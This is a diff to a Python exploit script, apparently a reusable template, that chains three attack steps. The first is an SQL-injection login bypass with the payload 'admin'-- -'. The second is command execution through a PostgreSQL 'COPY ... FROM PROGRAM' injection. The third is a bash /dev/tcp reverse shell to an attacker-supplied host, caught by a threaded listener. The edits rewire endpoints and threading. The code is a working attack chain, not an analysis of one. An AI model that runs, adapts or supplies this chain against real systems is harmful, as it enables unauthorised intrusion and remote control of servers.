@@ -14,6 +14,7 @@ import http.server
 import socketserver
 import sys
 import threading
+import time
 import requests
 import argparse
 import urllib.parse
@@ -130,14 +131,14 @@ def _interact(conn):
 
 # ─── HTTP server  ───────────────────────────────────────────────────────────────
 def start_file_server(host, port):
-        # Files source code
+    # Files source code
     php_file = b"<?php echo 'Hello World'; ?>"
     txt_file = b"hello world"
 
     # List <filename>: (<source_code>, <MIME type>) 
     routes = {
         "/file.php": (php_file, "application/octet-stream"),
-        "/login": (txt_file, "application/text"),
+        "/helloWorld.txt": (txt_file, "application/text"),
     }
 
     class Handler(http.server.BaseHTTPRequestHandler):
@@ -169,7 +170,7 @@ def start_file_server(host, port):
     log.success(f"[http server] Serving files on {host}:{port}")
     for path in routes:
         print(f"\t    -> {path}")
-
+    
     thread = threading.Thread(target=server.serve_forever, daemon=True)
     thread.start()
 
@@ -179,14 +180,14 @@ def start_file_server(host, port):
 def auth_bypass(session, target):
     log.info("Step 1: Attempting auth bypass...")
 
-    url = f"{target}/login" # Example vulnerable endpoint
+    url = f"{target}/login/" # Example vulnerable endpoint
 
     data = { # Example data
         "username": "admin'-- -",
         "password": "anything",
     }
 
-    r = session.post(url, data=data, allow_redirects=False)
+    r = session.get(url, data=data, allow_redirects=False)
 
     log.info(f"[step 1] {r.request.method} {url} -> {YELLOW}{r.status_code}{NC}")
     log.debug(f"[step 1] Response:\n {r.text[:200]}")
@@ -204,7 +205,7 @@ def auth_bypass(session, target):
 def rce(session, cookies, target, cmd):
     log.info(f"Step 2: Attempting RCE with cmd: {YELLOW}{cmd}{NC}")
 
-    url = f"{target}/uploads/shell.php" # Example vulnerable endpoint
+    url = f"{target}/uploads" # Example vulnerable endpoint
 
     payload = f"0; COPY cmd_out FROM PROGRAM '{cmd}'" # Example SQL Payload
     r = session.get(f"{url}", params={"id": payload}, cookies=cookies)
@@ -228,7 +229,7 @@ def rce(session, cookies, target, cmd):
 # ─── Step 3: Reverse Shell ────────────────────────────────────────────────────
 def reverse_shell(session, cookies, target, lhost, lport):
     log.info(f"Step 3: Attempting reverse shell to {lhost}:{lport}")
-
+    url = f"{target}/uploads/shell.php" # Example vulnerable endpoint
     shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" # Example payload
     log.debug(f"[step 3] Shell payload (raw): {shell}")
 
@@ -237,7 +238,7 @@ def reverse_shell(session, cookies, target, lhost, lport):
     log.debug(f"[step 3] Shell payload (encoded): {encoded}")
 
     # Reuse the RCE vector — pass the shell command through it
-    status = rce(session, cookies, target, shell)
+    status = rce(session, cookies, url, shell)
     if status == 200:
         log.success("[step 3] Reverse shell sent, watch your listener.")
     else:
@@ -266,10 +267,19 @@ def main():
     rce(session, cookies, target, "whoami")
 
     # Start listener in background
-    start_listener("0.0.0.0", args.lport)
+    #start_listener("0.0.0.0", args.lport)
+    thread = threading.Thread(target=start_listener, args=("0.0.0.0", args.lport), daemon=True)
+    thread.start()
 
     # Step 3 — Pop shell
     reverse_shell(session, cookies, target, args.lhost, args.lport)
+    while True:
+        try:
+            time.sleep(1)
+        except KeyboardInterrupt:
+            log.info("Exiting ...")
+            break
+    sys.exit(0)
 
 if __name__ == "__main__":
     main()
